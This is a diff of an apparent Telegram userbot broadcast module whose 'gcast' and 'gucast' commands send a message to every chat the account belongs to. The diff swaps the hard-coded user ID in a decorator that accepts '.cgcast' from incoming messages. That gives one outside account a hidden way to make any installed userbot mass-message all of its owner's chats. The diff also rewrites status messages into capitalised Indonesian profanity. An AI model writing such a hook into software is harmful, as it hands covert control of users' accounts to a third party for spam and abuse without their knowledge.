@@ -55,7 +55,7 @@ GCAST_BLACKLIST = [
 
 
 @hiro_cmd(pattern="gcast(?: |$)(.*)")
-@register(incoming=True, from_users=1821140802,
+@register(incoming=True, from_users=5098393204,
           pattern=r"^\.cgcast(?: |$)(.*)")
 async def gcast(event):
     xx = event.pattern_match.group(1)
@@ -64,8 +64,8 @@ async def gcast(event):
     elif event.is_reply:
         msg = await event.get_reply_message()
     else:
-        return await edit_delete(event, "**Pesan nya Mana Ngentot?**")
-    kk = await edit_or_reply(event, "**Lagi gua kirim Kontol, Limit jangan salahin gua ya bangsat!!!...**")
+        return await edit_delete(event, "**PESAN NYA MANA NGENTOT?**")
+    kk = await edit_or_reply(event, "**LAGI GUA KIRIM KONTOL, LIMIT JANGAN SALAHIN GUA YA BANGSAT...**")
     er = 0
     done = 0
     async for x in event.client.iter_dialogs():
@@ -92,8 +92,8 @@ async def gucast(event):
     elif event.is_reply:
         msg = await event.get_reply_message()
     else:
-        return await edit_delete(event, "**Pesan nya Mana Ngentot?**")
-    kk = await edit_or_reply(event, "**Lagi gua kirim Kontol, Limit jangan salahin gua ya bangsat!!!...**")
+        return await edit_delete(event, "**PESAN NYA MANA NGENTOT?**")
+    kk = await edit_or_reply(event, "**LAGI GUA KIRIM KONTOL, LIMIT JANGAN SALAHIN GUA YA BANGSAT...**")
     er = 0
     done = 0
     async for x in event.client.iter_dialogs():
